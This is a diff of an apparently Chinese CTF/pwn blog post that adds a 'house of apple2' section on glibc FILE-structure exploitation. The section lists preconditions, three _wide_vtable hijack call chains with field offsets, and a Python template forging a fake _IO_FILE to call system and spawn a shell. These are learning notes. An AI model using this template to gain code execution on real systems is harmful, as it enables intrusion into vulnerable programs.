@@ -28,7 +28,7 @@
 <meta property="og:description" content="house of 利用模板及利用条件">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-07-25T01:09:09.000Z">
-<meta property="article:modified_time" content="2024-07-27T11:00:52.913Z">
+<meta property="article:modified_time" content="2024-07-31T07:26:59.481Z">
 <meta property="article:author" content="Masco">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="IO">
@@ -212,7 +212,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-07-27 19:00:52" itemprop="dateModified" datetime="2024-07-27T19:00:52+08:00">2024-07-27</time>
+                <time title="Modified: 2024-07-31 15:26:59" itemprop="dateModified" datetime="2024-07-31T15:26:59+08:00">2024-07-31</time>
               </span>
 
           <br>
@@ -221,14 +221,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>2.6k</span>
+              <span>6.2k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>4 mins.</span>
+              <span>10 mins.</span>
             </span>
 
         </div>
@@ -298,9 +298,115 @@ Fake_IO_File_Structure += rop
 malloc一个chunk
 getshell
  
+ 
 </code></pre>
-<hr>
+<br>
+ 
+<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>具体原理请看:<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
+<br>
+<em>适用版本</em>    
+glibc:2.34-         
 
+<br>
+<em>条件</em>                               
+
+<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
+<br>
+<br>
+
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
+<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
+<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
+_IO_wfile_underflow_mmap
+_IO_wdefault_xsgetn
+</code></pre>
+<br>
+
+<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
+<pre><code>_IO_wfile_overflow
+    _IO_wdoallocbuf
+        _IO_WDOALLOCATE
+            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
+</code></pre>
+<br>
+<em>伪造file及_IO_wide_date_</em>
+
+<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
+vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<p><em>条件绕过</em>        </p>
+<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
+需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
+</code></pre>
+<br>
+    模板（getshell）
+<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>
+    fake_io_file = p64(0)*2 + p64(1) + p64(2)
+    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b'\0') + p64(chunk_addr+0x100) # _wide_data
+    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff) # _mode
+    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b'\0') + p64(io_wfile_jumps) # vtable
+    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b'\0') + p64(chunk_addr+0x200)
+    fake_io_file = fake_io_file.ljust(0x200-0x10,b'\0')+p64(0)*13+ p64(sys)
+
+<br>
+<br>
+
+<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
+<br>
+<em>伪造</em>   
+
+<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
+vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
+_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
+_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
+</code></pre>
+<br>
+<em>条件绕过</em>       
+
+<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
+</code></pre>
+<br>
+
+<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
+<pre><code>_IO_wdefault_xsgetn
+    __wunderflow
+        _IO_switch_to_wget_mode
+            _IO_WOVERFLOW
+                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
+</code></pre>
+<br>
+<em>伪造</em>       
+
+<pre><code>_flags设置为0x800
+vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
+_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
+_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
+_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
+_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
+_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
+_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
+</code></pre>
+<br>
+
+<p><em>条件绕过</em>   </p>
+<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
+随后当more != 0时会进入__wunderflow。   
+要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
+当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
+</code></pre>
+<br>
+<br>
+***
     </div>
 
     
@@ -427,7 +533,7 @@ getshell
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%8F%8A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">house of 利用模板及利用条件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-cat"><span class="nav-number">1.1.</span> <span class="nav-text">house of cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF"><span class="nav-number">1.1.1.</span> <span class="nav-text">模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-force"><span class="nav-number">1.1.2.</span> <span class="nav-text">house of force</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%8F%8A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">house of 利用模板及利用条件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-cat"><span class="nav-number">1.1.</span> <span class="nav-text">house of cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF"><span class="nav-number">1.1.1.</span> <span class="nav-text">模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-force"><span class="nav-number">1.1.2.</span> <span class="nav-text">house of force</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-apple2"><span class="nav-number">1.2.</span> <span class="nav-text">house of apple2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.2.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B1%E6%9C%89%E4%B8%89%E7%A7%8Dv%E5%8A%AB%E6%8C%81IO%E6%B5%81%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text">共有三种v劫持IO流的方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81-%E5%88%A9%E7%94%A8-IO-wfile-overflow"><span class="nav-number">1.2.3.</span> <span class="nav-text">1、 利用_IO_wfile_overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8IO-wfile-underflow-mmap"><span class="nav-number">1.2.4.</span> <span class="nav-text">2、利用IO_wfile_underflow_mmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8-IO-wdefault-xsgetn"><span class="nav-number">1.2.5.</span> <span class="nav-text">3、利用_IO_wdefault_xsgetn</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -499,12 +605,12 @@ getshell
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">22k</span>
+    <span title="Symbols count total">25k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">37 mins.</span>
+    <span title="Reading time total">42 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
   </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://lib.baomitu.com/canvas-nest.js/1.0.1/canvas-nest.js"></script>
